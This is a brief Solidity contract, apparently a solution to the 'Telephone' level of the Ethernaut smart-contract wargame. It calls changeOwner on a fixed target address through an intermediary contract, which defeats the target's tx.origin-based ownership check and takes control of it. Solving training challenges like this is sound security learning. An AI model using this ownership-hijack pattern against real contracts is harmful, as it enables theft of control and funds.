/**
 *Submitted for verification at Etherscan.io on 2021-08-28
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.6.0;


contract HackTelephoneEthernaut {
    
    address private telephoneContract = 0x0b6F6CE4BCfB70525A31454292017F640C10c768;
    
    constructor() public {
        
    }
    
    function takeOwnership() public {
        TelephoneI(telephoneContract).changeOwner(msg.sender);
    }
    
    
}

// SPDX-License-Identifier: MIT
pragma solidity 0.6.0;


interface TelephoneI{
    function changeOwner(address _owner) external;
}